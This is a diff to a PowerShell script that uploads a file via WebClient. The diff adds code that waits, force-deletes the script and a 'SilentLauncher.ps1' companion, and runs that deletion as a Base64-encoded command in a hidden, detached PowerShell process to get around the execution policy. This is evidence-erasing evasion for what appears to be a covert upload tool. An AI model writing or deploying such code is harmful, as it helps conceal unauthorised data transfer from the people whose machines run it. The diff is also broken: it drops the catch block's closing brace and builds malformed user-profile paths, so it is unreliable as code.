@@ -48,7 +48,20 @@ try {
 }
 catch {
     "Failed to upload the file. Error: $_"
-}
+
 finally {
     $webClient.Dispose()
 }
+
+# Self-deletion part
+$deletionScript = {
+    Start-Sleep -Seconds 10
+    Remove-Item -Path "C:\Users\$env:USERPROFILE\dl_ul.ps1" -Force
+    Remove-Item -Path "C:\Users\$env:USERPROFILE\SilentLauncher.ps1" -Force
+}
+
+# Encode the deletion script to bypass the execution policy temporarily
+$encodedDeletionScript = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($deletionScript))
+
+# Start the self-deletion script in a new detached process
+Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile", "-EncodedCommand $encodedDeletionScript" -WindowStyle Hidden
